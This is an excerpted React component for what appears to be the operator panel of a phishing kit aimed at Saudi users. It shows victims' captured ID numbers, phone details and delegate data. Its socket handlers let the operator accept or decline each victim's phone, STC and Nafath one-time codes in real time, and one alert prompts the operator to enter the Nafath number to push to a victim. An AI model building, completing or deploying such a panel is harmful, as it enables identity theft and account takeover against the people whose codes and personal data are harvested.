...
const Main = () => {
  ...
  const handleDeclineNormalPhone = (id) => {
  ...
  const handleDeclinePhoneOtp = (id) => {
    ...
    const _user = Users.find((u) => {
      if (u._id === id) {
        return { ...u, phoneOtpAccept: true, navazAccept: false };
      }
    });
    const withOut = Users.filter((u) => u._id !== id);
    setUsers([...withOut, _user]);
    setUser({
      data: { ..._user, phoneOtpAccept: true, navazAccept: false },
      active: true,
    });
  };

  const handleAcceptService = async (id) => {
    if (user.data.phoneNetwork === "اس تي سي") {
      if (!price) return window.alert("اكتب الرقم المرسل إلي نفاذ");
    }
    socket.emit("acceptService", { id, price });
    setUser({
      data: { ...user.data, networkAccept: true, navazAccept: false },
      active: true,
    });
    await getUsers();
  };
  ...
  const handleDeclineNavazOtp = (id) => {
    ...
    const _user = Users.find((u) => {
      if (u._id === id) {
        return { ...u, navazOtpAccept: true, navazAccept: true };
      }
    });
    const withOut = Users.filter((u) => u._id !== id);
    setUsers([...withOut, _user]);
    setUser({
      data: { ..._user, navazOtpAccept: true, navazAccept: true },
      active: true,
    });
  };
  ...
  const handleDeclineStcOtp = (id) => {
    socket.emit("declineStcPhoneOtp", id);
    const _user = Users.find((u) => {
      if (u._id === id) {
        return { ...u, phoneOtpAccept: true };
      }
    });
    const withOut = Users.filter((u) => u._id !== id);
    setUsers([...withOut, _user]);
    setUser({
      data: { ..._user, phoneOtpAccept: true },
      active: true,
    });
  };
            ...
            <div className="w-11/12  overflow-y-auto flex flex-1 gap-x-2 flex-wrap  ">
              <div className="flex flex-col items-center bg-sky-800 text-white py-2 px-3  rounded-lg gap-y-1 h-fit  my-2 w-1/4 ">
                ...
                <div className="grid grid-cols-2 md:grid-cols-1 items-start w-full">
                  ...
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> تفويض </span>
                    <span>{user.data?.delegate ? "نعم" : "لا"}</span>
                  </div>
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                  ...
                  {user.data?.first && (
                    <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                      <span> الحرف الأول </span>
                      <span>{user.data?.first}</span>
                    </div>
                  )}
                  {user.data?.second && (
                    <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                      <span> الحرف الثاني </span>
                      <span>{user.data?.second}</span>
                    </div>
                  )}
                  {user.data?.third && (
                    <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                      <span> الحرف الثالث </span>
                      <span>{user.data?.third}</span>
                    </div>
                  )}
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                  ...
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> مواد خطرة </span>
                    <span>{user.data?.danger_vechile ? "نعم" : "لا"}</span>
                  </div>
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                  ...
                  {user.data?.phoneId && (
                    <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                      <span> رقم الهوية للهاتف </span>
                      <span>{user.data?.phoneId}</span>
                    </div>
                  )}

                  {user.data?.commissioner_accept && (
                    <>
                      <div className="w-full col-span-2 md:col-span-1 border-t-2 border-yellow-400 mt-2 pt-2">
                        <span className="font-bold text-yellow-400">
                          بيانات المفوض
                        </span>
                      </div>
                      <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                        <span> نوع المفوض </span>
                        <span>{user.data?.commissioner_type}</span>
                      </div>
                      <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                        <span> اسم المفوض </span>
                        <span>{user.data?.commissioner_name}</span>
                      </div>
                      <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                        <span> جوال المفوض </span>
                        <span>
                          {user.data?.commissioner_country_code +
                            user.data?.commissioner_phone}
                        </span>
                      </div>
                      <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                        <span> جنسية المفوض </span>
                        <span>{user.data?.commissioner_nationality}</span>
                      </div>
                      <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                        <span> هوية المفوض </span>
                        <span>{user.data?.commissioner_id}</span>
                      </div>
                      <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                        <span> تاريخ ميلاد المفوض </span>
                        <span>{user.data?.commissioner_birthdate}</span>
                      </div>
                    </>
                  )}
                </div>
              ...
              {user.data?.phoneNumber ? (
                <div className="flex flex-col items-center bg-sky-800 text-white py-2 px-3 rounded-lg gap-y-1 h-fit   my-2">
                  ...
                  {user.data.phoneAccept ? (
                    ""
                  ) : user.data.phoneNetwork !== "اس تي سي" &&
                    user.data.phoneNetwork !== "موبايلي" ? (
                    <>
                      <div className="w-4/5 flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
                        <button
                          className="bg-green-500 w-1/2 p-2 rounded-lg"
                      ...
                      <>
                        ...
                        {!user.data.phoneOtpAccept ? (
                          <div className="w-full flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
                            <button
                              className="bg-green-500 w-1/2 p-2 rounded-lg"
                              onClick={() => handleAcceptStcOtp(user.data._id)}
                            >
                              قبول
                            </button>
                            <button
                              className="bg-red-500 w-1/2 p-2 rounded-lg"
                              onClick={() => handleDeclineStcOtp(user.data._id)}
                            >
                              رفض
                            </button>
                          </div>
